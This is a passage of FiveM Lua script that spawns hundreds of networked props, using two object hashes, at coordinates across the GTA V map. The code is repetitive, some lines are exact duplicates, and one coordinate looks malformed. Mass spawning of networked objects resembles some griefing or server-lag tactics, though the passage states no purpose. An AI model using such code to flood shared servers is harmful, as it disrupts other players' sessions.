            Citizen.Wait(0)
        CreateObject(3821613641, -1148.359375, -292.28182983398, 38.791648864746, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1170.48828125, -291.85784912109, 38.992107391357, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1193.6276855469, -291.40768432617, 38.889110565186, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1218.7214355469, -290.92233276367, 37.657947540283, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1233.4307861328, -303.12777709961, 37.736988067627, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1248.2092285156, -315.27133178711, 37.84058380127, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1267.5900878906, -331.3115234375, 36.98416519165, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1283.8361816406, -344.75610351562, 36.470161437988, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1305.3353271484, -356.01519775391, 36.613246917725, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1334.1020507812, -360.79891967773, 36.65678024292, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1350.9398193359, -363.59573364258, 36.494960784912, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1367.2520751953, -379.93838500977, 36.652248382568, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1380.2022705078, -394.00366210938, 36.445823669434, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1402.9261474609, -398.17565917969, 36.796722412109, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1423.9675292969, -410.1028137207, 36.635139465332, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1441.4888916016, -420.03536987305, 36.128063201904, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1453.7445068359, -426.98056030273, 35.317489624023, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1475.6639404297, -439.37313842773, 35.271514892578, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1489.6983642578, -447.29193115234, 35.367473602295, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1501.1840820312, -453.77963256836, 35.336555480957, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1519.5579833984, -464.14825439453, 35.0448608398, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1533.578125, -472.01034545898, 35.126083374023, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1548.4698486328, -480.34732055664, 35.123199462891, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1560.7679443359, -487.18835449219, 35.087757110596, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1563.197265625, -499.99365234375, 35.675567626953, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1581.5412597656, -515.58569335938, 35.297256469727, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1605.193359375, -520.12579345703, 34.724109649658, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1688.1834716797, -528.16271972656, 40.576705932617, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1721.0336914062, -510.43545532227, 40.12907409668, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1741.0587158203, -501.48364257812, 38.634918212891, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1756.7415771484, -481.97271728516, 40.477088928223, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1769.8996582031, -465.51202392578, 41.534847259521, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1782.4383544922, -449.83868408203, 41.548976898193, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1804.0675048828, -439.05447387695, 42.195014953613, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1819.3243408203, -431.49542236328, 42.949752807617, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1831.8289794922, -425.26312255859, 43.874549865723, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1853.2891845703, -414.64498901367, 45.302425384521, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1868.5047607422, -407.18606567383, 46.350208282471, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1885.1983642578, -384.8176574707, 48.292461395264, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1890.3519287109, -366.56503295898, 48.854564666748, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1884.8326416016, -352.58810424805, 49.027431488037, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1876.5070800781, -331.61865234375, 47.802089691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1846.9636230469, -276.33001708984, 46.736312866211, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1819.0274658203, -325.36376953125, 45.809062957764, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1815.0964355469, -339.87322998047, 45.582927703857, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1808.5787353516, -364.11291503906, 44.005798339844, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1802.4747314453, -385.29006958008, 42.198215484619, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1790.9311523438, -428.03890991211, 38.48904800415, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1788.2253417969, -444.82955932617, 36.995174407959, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1784.5886230469, -467.58825683594, 34.884159088135, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1779.6987304688, -498.20559692383, 32.018699645996, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1774.1787109375, -532.76300048828, 28.706546783447, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1769.2905273438, -563.36108398438, 25.689037322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1766.2933349609, -582.12066650391, 23.8088016501, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1768.0249023438, -628.46899414062, 10.519196510315, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1759.4582519531, -646.53729248047, 10.309303283691, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1751.3765869141, -663.78558349609, 10.14768409729, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1740.7327880859, -686.55798339844, 10.167251586914, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1713.8133544922, -719.93347167969, 10.937111854553, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1696.1872558594, -733.31097412109, 11.090492248535, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1676.1856689453, -748.51867675781, 9.9981365203857, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1665.0916748047, -758.46258544922, 12.244045257568, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1647.5239257812, -776.37884521484, 13.427575111389, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1651.6759033203, -799.07305908203, 12.3508644104, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1656.9287109375, -823.55224609375, 10.77232170105, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1662.8148193359, -850.9658203125, 8.9593496322632, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1666.8171386719, -869.54602050781, 8.6330251693726, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1671.4582519531, -891.08728027344, 8.290337562561, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1676.3131103516, -913.60424804688, 7.8747358322144, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1679.9108886719, -930.2587890625, 7.4615921974182, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1684.5755615234, -951.86242675781, 7.5586032867432, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1689.5715332031, -975.40484619141, 6.8873271942139, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1693.1550292969, -992.03637695312, 6.3932785987854, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1657.939453125, -1028.4793701172, 12.766311645508, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1674.8597412109, -1044.0367431641, 12.859534263611, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1688.9105224609, -1056.8914794922, 12.827094078064, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1706.6948242188, -1073.1491699219, 12.829881668091, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1842.8005371094, -1232.2490234375, 12.765271186829, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1859.7833251953, -1221.6228027344, 13.040806770325, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1879.8327636719, -1201.8630371094, 13.140325546265, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1818.8970947266, -1244.9155273438, 16.184650421143, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1667.5478515625, -1112.1121826172, 15.34307384491, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1488.2962646484, -956.50500488281, 8.6661567687988, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1481.39453125, -965.09893798828, 9.0651473999023, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1442.4974365234, -02.0303344727, 8.0529880523682, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1426.8947753906, -1020.1224975586, 4.8073205947876, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1409.9012451172, -1039.7980957031, 4.3698844909668, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1390.2004394531, -1062.5466308594, 3.8684072494507, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1375.0466308594, -1080.0139160156, 3.980809211731, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1366.4007568359, -1114.6849365234, 8.4048643112183, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1364.3050537109, -1128.5925292969, 8.2246036529541, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1360.8507080078, -1151.4663085938, 7.1339063644409, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1358.1575927734, -1169.2646484375, 5.4720897674561, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1357.9407958984, -1197.0061035156, 4.2607550621033, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1361.3116455078, -1217.8570556641, 4.3437147140503, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1355.15234375, -1240.2905273438, 4.6479821205139, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1345.3043212891, -1262.2491455078, 6.5375714302063, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1335.3063964844, -1284.5822753906, 7.0228791236877, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1330.1655273438, -1297.8234863281, 6.3680057525635, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1324.9270019531, -1331.2257080078, 5.0359969139099, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1317.7286376953, -1348.9234619141, 5.4501256942749, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1308.4112548828, -1374.6842041016, 4.6584057807922, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1301.1278076172, -1396.6988525391, 4.1395206451416, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1294.0227050781, -1418.3414306641, 4.158908367157, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1276.6690673828, -1437.6485595703, 4.460620880127, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1262.9663085938, -1456.3391113281, 4.6627221107483, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1250.4888916016, -1473.3486328125, 4.041736125946, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1240.3615722656, -1487.1064453125, 4.0352692604065, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1218.2188720703, -1517.1315917969, 4.1369280815125, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1212.6579589844, -1549.1138916016, 4.4212770462036, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1202.3359375, -1566.4606933594, 4.8673343658447, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1039.8928222656, -1397.20830078, 5.301194190979, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -205.97943115234, -1307.7111816406, 32.463283538818, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -208.08169555664, -1322.1918945312, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -210.46829223633, -1332.6993408203, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 87.46117401123, -1925.2875976562, 22.540056228638, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 101.1555557251, -1933.6849365234, 23.343391418457, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 114.682762146, -1942.3416748047, 22.059331893921, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 91.787879943848, -1947.1599121094, 22.13903427124, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -96.82292175293, -1583.6147460938, 31.914810180664, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -165.88885498047, -1669.705078125, 32.914325714111, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -131.21087646484, -1583.7025146484, 33.982086181641, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -564.41174316406, 272.36557006836, 84.375846862793, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 376.63070678711, 322.68417358398, 103.56887054443, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 435.130305859, 216.90020751953, 102.91343688965, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 462.97250366211, 242.70608520508, 105.35186767578, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 463.30364990234, 252.55215454102, 107.32363891602, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 437.65286254883, 266.67935180664, 103.01537322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 429.43933105469, 250.82200622559, 105.63001251221, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 961.47344970703, -137.86401367188, 74.19605255127, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 980.24877929688, -127.23160552979, 73.605422973633, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 968.25885009766, -118.1788482666, 74.214859008789, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 988.52282714844, -112.56884002686, 74.228507995605, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 988.68646240234, -101.54683685303, 74.598121643066, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 980.42834472656, -105.61399841309, 74.69669342041, true, true, true)
        Citizen.Wait(0)
        CreateObject(3295673357, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
